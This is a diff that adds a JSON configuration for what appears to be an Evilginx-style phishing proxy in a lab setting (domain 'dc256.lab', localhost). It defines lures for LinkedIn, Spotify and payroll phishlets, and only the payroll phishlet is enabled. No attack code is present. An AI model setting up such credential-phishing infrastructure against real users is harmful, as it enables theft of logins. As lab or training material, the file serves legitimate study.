@@ -1,0 +1,220 @@
+{
+  "blacklist": {
+    "mode": "unauth"
+  },
+  "general": {
+    "domain": "dc256.lab",
+    "ipv4": "",
+    "external_ipv4": "127.0.0.1",
+    "bind_ipv4": "",
+    "unauth_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+    "https_port": 443,
+    "dns_port": 53,
+    "autocert": true
+  },
+  "lures": [
+    {
+      "id": "",
+      "hostname": "",
+      "path": "/EIxDuqTi",
+      "redirect_url": "",
+      "phishlet": "example",
+      "redirector": "",
+      "ua_filter": "",
+      "info": "",
+      "og_title": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_url": "",
+      "paused": 0
+    },
+    {
+      "id": "",
+      "hostname": "",
+      "path": "/NUXXfoRz",
+      "redirect_url": "",
+      "phishlet": "Linkedin",
+      "redirector": "",
+      "ua_filter": "",
+      "info": "",
+      "og_title": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_url": "",
+      "paused": 0
+    },
+    {
+      "id": "",
+      "hostname": "",
+      "path": "/UBTTKvVe",
+      "redirect_url": "",
+      "phishlet": "Spotify",
+      "redirector": "",
+      "ua_filter": "",
+      "info": "",
+      "og_title": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_url": "",
+      "paused": 0
+    },
+    {
+      "id": "",
+      "hostname": "",
+      "path": "/VnrKcVFf",
+      "redirect_url": "",
+      "phishlet": "Spotify",
+      "redirector": "",
+      "ua_filter": "",
+      "info": "",
+      "og_title": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_url": "",
+      "paused": 0
+    },
+    {
+      "id": "",
+      "hostname": "",
+      "path": "/bDRxCNGt",
+      "redirect_url": "",
+      "phishlet": "payroll",
+      "redirector": "",
+      "ua_filter": "",
+      "info": "",
+      "og_title": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_url": "",
+      "paused": 0
+    },
+    {
+      "id": "",
+      "hostname": "",
+      "path": "/fjYIlMTD",
+      "redirect_url": "",
+      "phishlet": "payroll",
+      "redirector": "",
+      "ua_filter": "",
+      "info": "",
+      "og_title": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_url": "",
+      "paused": 0
+    },
+    {
+      "id": "",
+      "hostname": "",
+      "path": "/ZjcEuRKy",
+      "redirect_url": "",
+      "phishlet": "payroll",
+      "redirector": "",
+      "ua_filter": "",
+      "info": "",
+      "og_title": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_url": "",
+      "paused": 0
+    }
+  ],
+  "phishlets": {
+    "Linkedin": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "Spotify": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "Twitter": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "benefitsbox": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "buildhive": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "cloudconsole": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "devicevault": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "example": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "gitforge": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "helpdeskpro": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "learnloop": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "ledgercloud": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "payroll": {
+      "hostname": "dc256.lab",
+      "unauth_url": "",
+      "enabled": true,
+      "visible": true
+    },
+    "peopleportal": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "ticketnest": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "traveldesk": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    }
+  }
+}
